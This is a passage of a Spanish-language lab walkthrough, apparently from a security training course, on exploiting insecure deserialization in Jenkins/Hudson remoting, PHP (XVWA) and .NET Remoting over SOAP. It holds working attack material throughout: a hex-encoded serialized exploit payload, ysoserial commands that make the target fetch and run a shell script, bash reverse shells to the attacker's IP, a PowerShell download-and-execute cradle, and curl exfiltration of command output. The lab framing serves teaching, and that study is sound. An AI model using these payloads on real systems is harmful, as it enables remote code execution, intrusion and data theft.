\x6e\x73\x65\x74\x00\x1a\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x77\x04\x00\x00\x00\x00\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x09\x63\x72\x65\x61\x74\x65\x64\x41\x74\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x77\x04\x00\x00\x00\x00\x78\x70\x73\x72\x00\x1e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x24\x53\x6f\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x06\x74\x68\x69\x73\x24\x30\x74\x00\x19\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x43\x6f\x6d\x6d\x61\x6e\x64\x3b\x77\x04\x00\x00\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x71\x00\x7e\x00\x02\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x71\x00\x7e\x00\x10\x70\x75\x72\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x02\x46\x2a\x3c\x3c\xfd\x22\x39\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x0b\x73\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x61\x09\xc5\x9a\x26\x36\xdd\x85\x02\x00\x04\x49\x00\x0a\x6c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x4c\x00\x0e\x64\x65\x63\x6c\x61\x72\x69\x6e\x67\x43\x6c\x61\x73\x73\x71\x00\x7e\x00\x02\x4c\x00\x08\x66\x69\x6c\x65\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x4c\x00\x0a\x6d\x65\x74\x68\x6f\x64\x4e\x61\x6d\x65\x71\x00\x7e\x00\x02\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x43\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x74\x00\x0c\x43\x6f\x6d\x6d\x61\x6e\x64\x2e\x6a\x61\x76\x61\x74\x00\x06\x3c\x69\x6e\x69\x74\x3e\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x32\x71\x00\x7e\x00\x15\x71\x00\x7e\x00\x16\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x63\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x74\x00\x0c\x52\x65\x71\x75\x65\x73\x74\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x02\x39\x74\x00\x32\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x24\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x74\x00\x1c\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\xf6\x74\x00\x27\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x6d\x6f\x74\x65\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x48\x61\x6e\x64\x6c\x65\x72\x71\x00\x7e\x00\x1e\x74\x00\x06\x69\x6e\x76\x6f\x6b\x65\x73\x71\x00\x7e\x00\x13\xff\xff\xff\xff\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x24\x50\x72\x6f\x78\x79\x31\x70\x74\x00\x0f\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x04\xe7\x74\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x68\x61\x6e\x6e\x65\x6c\x74\x00\x0c\x43\x68\x61\x6e\x6e\x65\x6c\x2e\x6a\x61\x76\x61\x74\x00\x15\x77\x61\x69\x74\x46\x6f\x72\x52\x65\x6d\x6f\x74\x65\x50\x72\x6f\x70\x65\x72\x74\x79\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x93\x74\x00\x0e\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x74\x00\x08\x43\x4c\x49\x2e\x6a\x61\x76\x61\x71\x00\x7e\x00\x17\x73\x71\x00\x7e\x00\x13\x00\x00\x00\x48\x74\x00\x1f\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x74\x00\x19\x43\x4c\x49\x43\x6f\x6e\x6e\x65\x63\x74\x69\x6f\x6e\x46\x61\x63\x74\x6f\x72\x79\x2e\x6a\x61\x76\x61\x74\x00\x07\x63\x6f\x6e\x6e\x65\x63\x74\x73\x71\x00\x7e\x00\x13\x00\x00\x01\xdf\x71\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x05\x5f\x6d\x61\x69\x6e\x73\x71\x00\x7e\x00\x13\x00\x00\x01\x86\x71\x00\x7e\x00\x2a\x71\x00\x7e\x00\x2b\x74\x00\x04\x6d\x61\x69\x6e\x73\x72\x00\x26\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x4c\x69\x73\x74\xfc\x0f\x25\x31\xb5\xec\x8e\x10\x02\x00\x01\x4c\x00\x04\x6c\x69\x73\x74\x71\x00\x7e\x00\x0f\x77\x04\xff\xff\xff\xfd\x78\x72\x00\x2c\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x73\x24\x55\x6e\x6d\x6f\x64\x69\x66\x69\x61\x62\x6c\x65\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x19\x42\x00\x80\xcb\x5e\xf7\x1e\x02\x00\x01\x4c\x00\x01\x63\x74\x00\x16\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x43\x6f\x6c\x6c\x65\x63\x74\x69\x6f\x6e\x3b\x77\x04\xff\xff\xff\xfd\x78\x70\x73\x72\x00\x13\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x41\x72\x72\x61\x79\x4c\x69\x73\x74\x78\x81\xd2\x1d\x99\xc7\x61\x9d\x03\x00\x01\x49\x00\x04\x73\x69\x7a\x65\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x00\x77\x04\x00\x00\x00\x00\x78\x71\x00\x7e\x00\x39\x78\x71\x00\x7e\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x70\x00\x00\x00\x01\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f\x10\x73\x29\x6c\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x18\x68\x75\x64\x73\x6f\x6e\x2e\x63\x6c\x69\x2e\x43\x6c\x69\x45\x6e\x74\x72\x79\x50\x6f\x69\x6e\x74\x71\x00\x7e\x00\x24\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d\x7b\x47\x02\x00\x00\x77\x04\xff\xff\xff\xfd\x78\x70\x00\x00\x00\x01\x74\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x74\x00\x1d\x52\x50\x43\x52\x65\x71\x75\x65\x73\x74\x28\x31\x2c\x77\x61\x69\x74\x46\x6f\x72\x50\x72\x6f\x70\x65\x72\x74\x79\x29'
print 'sending payload...'
sock.send(payload)
data = sock.recv(1024)
print('received "%s"' % data)

sock.close()
```

Paso 5: Crear una carga útil de shell inverso.

Copie y pegue el comando en un archivo y guárdelo como shell.sh.

Sintaxis:

```
bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
```

Mandar:

```
bash -i >& /dev/tcp/192.24.161.2/9999 0>&1
```

Paso 6: Configura un agente de escucha Netcat que escuchará las conexiones en el puerto 9999.

Mandar:

```
nc -lvp 9999
```

Paso 7: Aloje el archivo shell.sh usando un Python SimpleHTTPServer. En el mismo directorio donde está presente el archivo, ejecute lo siguiente.

Mandar:

```
python -m SimpleHTTPServer 8888
```

Paso 8: Genere una carga útil con un archivo ysoserial y haga que la máquina de destino descargue el archivo shell.sh de la máquina atacante.

Mandar:

```
java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 "curl http://192.24.161.2:8888/shell.sh -o /tmp/shell.sh" > /root/payload.out
```

Paso 9: Ejecute el código de explotación de Python.

Uso: python exploit.py \</path/to/payload>

Mandar:

```
python exploit.py 192.24.161.3 8080 /root/payload.out
```

Este resultado del servidor python muestra que shell.sh archivo es descargado por la máquina de destino y que la carga útil funciona como se esperaba.

Tenemos que ejecutar el exploit de python dos veces más para ejecutar el script bash en la máquina de destino.

Paso 10: Vuelve a generar una carga útil para hacer que el archivo shell.sh descargado sea ejecutable.

Mandar:

```
java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 "chmod +x /tmp/shell.sh" > /root/payload.out
```

Paso 11: Ejecute el código python nuevamente para enviar la carga útil para hacer que shell.sh archivo sea ejecutable.

Mandar:

```
python exploit.py 192.24.161.3 8080 /root/payload.out
```

Paso 12: Genere una carga útil para ejecutar el archivo shell.sh descargado nuevamente.

Mandar:

```
java -jar ~/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar CommonsCollections1 "/bin/bash /tmp/shell.sh" > /root/payload.out
```

Paso 13: Ejecute el código python nuevamente para enviar la carga útil a la máquina de destino para ejecutar shell.sh archivo.

Mandar:

```
python exploit.py 192.24.161.3 8080 /root/payload.out
```

Paso 14: Abre el terminal donde el Netcat estaba escuchando. El shell debe llegar al agente de escucha de Netcat.

Compruebe el id mediante el siguiente comando.

Mandar:

```
id
```

> Ejecución remota de código lograda con éxito.

### Laboratorio 3 <a href="#lab-3" id="lab-3"></a>

Solución

Paso 1: Abra el enlace del laboratorio para acceder a la instancia de la GUI de Kali.

Paso 2: Compruebe si se puede acceder a la máquina/dominio proporcionado.

Mandar:

```
ping -c3 demo.ine.local
```

Se puede acceder a la máquina suministrada.

Paso 3: Verifique los puertos abiertos en la máquina proporcionada.

Mandar:

```
nmap -sS -sV demo.ine.local
```

Los puertos 80 (servidor web Apache) y 3306 (servidor MySQL) están abiertos en el equipo de destino.

Paso 4: Abra el navegador para inspeccionar el sitio web alojado.

```
URL: http://demo.ine.local
```

> Una instancia de XVWA se aloja en el servidor web Apache.

Paso 5: Abre la página de Inyección de Objetos PHP.

Seleccione PHP Object Injection del conjunto de vulnerabilidades disponibles:

Paso 6: Interactúa con la página vulnerable.

```
Press the CLICK HERE button and notice the resulting URL:
```

Debería ver la siguiente URL:

http://demo.ine.local/xvwa/vulnerabilities/php\_object\_injection/?r=a:2:{i:0; s:4:"XVWA"; I:1; s:33:"Aplicación web vulnerable Xtreme";}

Hay un objeto en el parámetro URL

> Si observa de cerca, los valores presentes en este parámetro: XVWA y Xtreme Vulnerable Web Application se muestran en la página.

Pero, ¿qué es exactamente este objeto contenido en el parámetro **r**?

Vamos a buscarlo:

Cadena de búsqueda:

```
a:2:{i:0;s:4:"";i:1;s:33:"";}
```

Hemos omitido intencionadamente cualquier referencia a XVWA para evitar obtener resultados específicos sobre ella.

Tenga en cuenta que obtuvimos algunos resultados que indican que se trata de datos PHP serializados.

Uno de los comentarios sobre SO también indica que se deben usar los métodos de serialización y deserialización de PHP en este tipo de entrada:

Intentemos producir resultados similares usando el método serialize de PHP:

Comandos:

```
php -a
echo serialize("Hello World!");
echo serialize(array('a', 2, 'c', 4, 'e', 6, 'g', 8, 'i', 10));
```

Los comandos anteriores harían lo siguiente:

```
php -a: Launch an interactive PHP environment - a REPL (read-eval-print-loop). Here we can run PHP code without having to set up any webserver.
```

El segundo comando serializaba la cadena Hello World!.

El resultado es bastante simple:

```
s:12 
# indicates what follows is a string of 12 characters.
```

El tercer comando va un paso más allá y serializa una matriz, que es donde la serialización tiene su valor, más sobre eso en breve.

El resultado dice

````
a:10
```bash

, indicating what follows is an array of size 10. Then we have all the elements of the array. Each array elements index and value are indicated. For instance, lets consider the first two elements:

```bash
i:0;s:1:"a"
# Element at index 0 is a string of size 1 and that string is "a".
i:0;i:2
# Element at index 1 is an integer and it's value is 2.
````

> Esperemos que esto tenga mucho más sentido ahora.

¿Qué es la serialización?

* A veces se llega a situaciones en las que hay que pasar objetos a través de la red, o el estado de un programa se va a almacenar para su uso posterior. ¿Cómo se puede hacer eso, siempre que la información esté presente en un objeto?
* Una posibilidad es guardar todas las propiedades del objeto y luego volver a rellenarlas más tarde. Eso sería bueno, pero sería reinventar la rueda y no sería tan optimizado y compacto como podría haber sido. Los objetos serializados también deben deserializarse posteriormente. Dado que este es un requisito estándar, está integrado en los lenguajes de programación como Java, PHP y similares.

> Ahora que sabemos que el parámetro que vimos en la URL era en realidad un objeto serializado de PHP, averigüémoslo usando lo que aprendimos anteriormente:

Comandos:

```
php -a
echo unserialize('a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}');
var_dump(unserialize('a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}'));
```

Ejecutamos el código PHP desde el modo interactivo y deseriallizamos el objeto PHP. Tenga en cuenta que es una matriz asociativa que tiene dos elementos.

Consulte el manual de PHP para deserializar:

Fíjate en el gran mensaje rojo de advertencia. Es una clara advertencia a los desarrolladores sobre la amenaza RCE si pasan la entrada controlada por el usuario a la función Función de deserialización.

Paso 7: Comprueba el código fuente de la página de inyección de objetos PHP desde Github.

```
URL: https://github.com/s4n7h0/xvwa/blob/master/vulnerabilities/php_object_injection/home.php
```

Observe el fragmento de código relevante que se muestra en la imagen anterior. Si la solicitud contiene el parámetro **r**, su valor no está serializado. Además, observe la llamada a **eval**: el parámetro inject se pasa directamente a **eval**, lo cual es una excelente oportunidad para RCE.

Paso 8: Explota la vulnerabilidad de deserialización insegura de PHP.

Guarde el siguiente fragmento de código como object.php

```
<?php
class PHPObjectInjection {
    public $inject = "system('id');";
}

$obj = new PHPObjectInjection();
var_dump(serialize($obj));
?>

```

Observe que el fragmento de código anterior establece el parámetro inject en system('id'), que ejecutaría el comando id en el servidor web.

Serialice el objeto:

Mandar:

```
php object.php
```

Carga serializada:

```
O:18:"PHPObjectInjection":1:{s:6:"inject";s:13:"system('id');";}
```

* Asigne el valor generado en el parámetro **r** de la URL:

Observe que los resultados del comando id se muestran en la página.

Con eso, explotamos con éxito el problema de la deserialización insegura para ejecutar comandos arbitrarios.

Paso 9: Comprueba la lista de procesos en ejecución.

Ahora que tenemos la ejecución del código en el servidor de destino, vamos a comprobar la lista de procesos en ejecución:

Guarde el siguiente fragmento de código como object.php

```
<?php
class PHPObjectInjection {
    public $inject = "system('ps aux');";
}

$obj = new PHPObjectInjection();
var_dump(serialize($obj));
?>

```

Serialice el objeto:

Mandar:

```
php object.php
```

Carga serializada:

```
O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('ps aux');";}
```

Asigne el valor generado en el parámetro **r** de la URL:

Se recupera la lista de procesos, como se muestra en la imagen anterior.

Compruebe la fuente de la página para obtener una respuesta con mejor formato (presione CTRL+U):

Paso 10: Obtén una cáscara inversa.

Ejecutar comandos individuales es bueno, pero requiere que generemos el valor serializado cada vez.

> Consigamos una cáscara inversa para evitar eso.

Antes de pasar a la parte de generación de la carga útil, recupere la dirección IP de la máquina atacante:

Mandar:

```
ip addr
```

La dirección IP de la máquina atacante es 192.222.13.2

> \[Nota] La dirección IP está destinada a cambiar con cada ejecución de laboratorio. Por favor, asegúrese de reemplazar la dirección IP utilizada en la carga útil. De lo contrario, la carga útil no funcionaría.

Guarde el siguiente fragmento de código como object.php

```
<?php
class PHPObjectInjection {
    public $inject = "system('/bin/bash -c \'bash -i >& /dev/tcp/192.222.13.2/54321 0>&1\'');";
}

$obj = new PHPObjectInjection();
var_dump(serialize($obj));
?>

```

Serialice el objeto:

Mandar:

```
php object.php
```

Carga serializada:

```
O:18:"PHPObjectInjection":1:{s:6:"inject";s:71:"system('/bin/bash -c \'bash -i >& /dev/tcp/192.222.13.2/54321 0>&1\'');";}
```

Inicie un agente de escucha Netcat en el puerto 54321 (ya que también especificamos este puerto en la carga útil del shell inverso):

Mandar:

```
nc -lvp 54321
```

Asigne el valor generado en el parámetro **r** de la URL:

No funcionó. Pero, ¿por qué?

Esto se debe a que la carga útil serializada contiene caracteres como **/** y **&** que son tratados especialmente por el navegador web y el servidor.

> Para evitarlo, codificaremos la carga serializada.

Puedes usar Burp para hacer eso o usar sitios web como https://www.url-encode-decode.com/ para hacer el trabajo:

Carga serializada codificada en URL:

```
O%3A18%3A%22PHPObjectInjection%22%3A1%3A%7Bs%3A6%3A%22inject%22%3Bs%3A71%3A%22system%28%27%2Fbin%2Fbash+-c+%5C%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.222.13.2%2F54321+0%3E%261%5C%27%27%29%3B%22%3B%7D
```

> \[Nota] Asegúrese de no copiar esta carga tal cual, ya que la IP sería diferente para la máquina atacante que se le asignó.

Asigne la carga útil codificada en URL en el parámetro **r** de la URL:

Compruebe el terminal en el que se estaba ejecutando el agente de escucha de Netcat:

> ¡Hemos ganado un caparazón inverso!

Ahora podemos ejecutar comandos sin tener que generar cargas útiles de comandos cada vez:

Comandos:

```
id
pwd
ls -al
```

Con esto, concluimos este laboratorio sobre la deserialización insegura de PHP, también conocida como inyección de objetos PHP.

> Aprendimos sobre la serialización y la deserialización, cómo generar valores serializados y cómo deserializarlos. También revisamos el código PHP y descubrimos el uso de un sumidero de ejecución de código, es decir, la función eval.

> Por último, explotamos el código vulnerable mediante la generación de objetos serializados maliciosos para obtener la ejecución de comandos en el servidor de destino.

Referencias:

```
- XVWA = https://github.com/s4n7h0/xvwa
- PHP Associative Arrays = https://www.w3schools.com/PHP/php_arrays_associative.asp
- PHP Serialize = https://www.php.net/manual/en/function.serialize.php
- PHP Unserialize = https://www.php.net/manual/en/function.unserialize.php
```

### Laboratorio 4 <a href="#lab-4" id="lab-4"></a>

Soluciones

A continuación, puede encontrar soluciones para cada tarea. Sin embargo, recuerda que puedes seguir tu propia estrategia, que puede ser diferente de la que se explica en el siguiente laboratorio.

Tarea 1. Realice un reconocimiento y encuentre un servicio web basado en jabón

Un escaneo de puertos revela dos posibles candidatos (ver más abajo).

```
nmap -sV -p- demo.ine.local -T4 --open -v -Pn
```

Los resultados son:

```
Not shown: 62690 closed tcp ports (reset), 2831 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1234/tcp  open  http               MS .NET Remoting httpd (.NET CLR 4.0.30319.42000)
3389/tcp  open  ssl/ms-wbt-server?
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
49192/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

Al examinar el servicio en el puerto 80, se muestra una trama que no se puede cargar.

El servicio en el puerto 1234 reacciona a un mensaje SOAP simple.

> \[Nota] Que se trate de un endpoint de servicio válido, ya que al solicitar una ruta incorrecta el error menciona **Servicio solicitado no encontrado**.

Tarea 2. Ejecutar código en un equipo remoto

Vamos a usar ysoserial.net para generar una carga útil en SoapFormat, en un intento de identificar si el servicio remoto es vulnerable.

```
Note that you might need to remove \<SOAP:Body> tags from the resulting payload before testing.
```

También tenga en cuenta que necesita un sistema operativo Windows en el que ejecutará el binario ysoserial.net con el siguiente comando:

```
ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c [command]" -o raw
```

El protocolo de serialización de .NET en este caso no verifica la longitud de la cadena de comandos, por lo que será posible interferir con ella después de generar la carga. A continuación, la carga útil se copia en Burp con los siguientes cambios:

* Como se dijo anteriormente, las etiquetas del cuerpo del jabón deben eliminarse
* Para tener un mensaje SOAP válido, se requiere un encabezado SOAPAction ficticio. Esto está relacionado con SOAP y no está relacionado con este laboratorio específico
* El tipo de contenido debe ser text/xml como en todas las solicitudes SOAP
* Si recibe un error que indica que **no se encontró el servicio solicitado**, es posible que también deba borrar algunos espacios en blanco / nuevas líneas

La ejecución de código ciego se puede confirmar, por ejemplo, mediante ping.

Para ello, necesitamos la dirección IP de la máquina atacante:

Mandar:

```
ip addr
```

Pedir:

```
POST /VulnerableEndpoint.rem HTTP/1.1
Host: demo.ine.local:1234
SOAPAction: something
Content-type: text/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://demo.ine.local/
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 1478

<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                   xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
                   xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
                   xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0"
                   SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <a1:TextFormattingRunProperties id="ref-1"
                                  xmlns:a1="http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35">
    <ForegroundBrush id="ref-3">
      &lt;ResourceDictionary
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:System="clr-namespace:System;assembly=mscorlib"
        xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"&gt;
        &lt;ObjectDataProvider x:Key="" ObjectType="{x:Type Diag:Process}" MethodName="Start" &gt;
          &lt;ObjectDataProvider.MethodParameters&gt;
            &lt;System:String&gt;cmd&lt;/System:String&gt;
            &lt;System:String&gt;"/c ping 10.10.27.2"&lt;/System:String&gt;
          &lt;/ObjectDataProvider.MethodParameters&gt;
        &lt;/ObjectDataProvider&gt;
      &lt;/ResourceDictionary&gt;
    </ForegroundBrush>
  </a1:TextFormattingRunProperties>
</SOAP-ENV:Envelope>


```

> \[Nota] Asegúrese de colocar la dirección IP de su máquina atacante en el comando anterior.

Antes de enviar la solicitud anterior, utilice el siguiente comando para escuchar las solicitudes/respuestas ICMP:

Mandar:

```
tcpdump -i any icmp
```

Envíe la solicitud al punto de conexión SOAP vulnerable:

En el momento en que se envía la solicitud elaborada, podemos notar que el tráfico ICMP llega a nuestro sniffer desde el objetivo remoto.

Tarea 3. Obtener la salida del comando mediante un canal fuera de banda

Hay muchos métodos para lograr ese objetivo. Realizaremos la tarea usando PowerShell. Primero, crearemos el siguiente fragmento y luego lo alojaremos usando el módulo SimpleHTTPServer de Python.

```
$c=whoami;curl http://10.10.27.2:445/$c
python3 -m http.server 445
```

> \[Nota] Asegúrese de colocar la dirección IP de su máquina atacante en el comando anterior.

Y, por último, se inyecta el siguiente comando en la carga serializada:

```
powershell -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.27.2:445/payload.txt')"
```

> \[Nota] Asegúrese de colocar la dirección IP de su máquina atacante en el comando anterior.

La solicitud de exfiltración de datos fuera de banda a través de la ejecución de comandos es:

```
POST /VulnerableEndpoint.rem HTTP/1.1
Host: demo.ine.local:1234
SOAPAction: something
Content-type: text/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://demo.ine.local/
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 1478

<SOAP-ENV:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                   xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
                   xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
                   xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0"
                   SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <a1:TextFormattingRunProperties id="ref-1"
                                  xmlns:a1="http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35">
    <ForegroundBrush id="ref-3">
      &lt;ResourceDictionary
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:System="clr-namespace:System;assembly=mscorlib"
        xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"&gt;
        &lt;ObjectDataProvider x:Key="" ObjectType="{x:Type Diag:Process}" MethodName="Start" &gt;
          &lt;ObjectDataProvider.MethodParameters&gt;
            &lt;System:String&gt;cmd&lt;/System:String&gt;
            &lt;System:String&gt;"/c powershell -exec Bypass -C \"IEX (New-Object Net.WebClient).DownloadString('http://10.10.27.2:445/payload.txt')\""&lt;/System:String&gt;
          &lt;/ObjectDataProvider.MethodParameters&gt;
        &lt;/ObjectDataProvider&gt;
      &lt;/ResourceDictionary&gt;
    </ForegroundBrush>
  </a1:TextFormattingRunProperties>
</SOAP-ENV:Envelope>


```

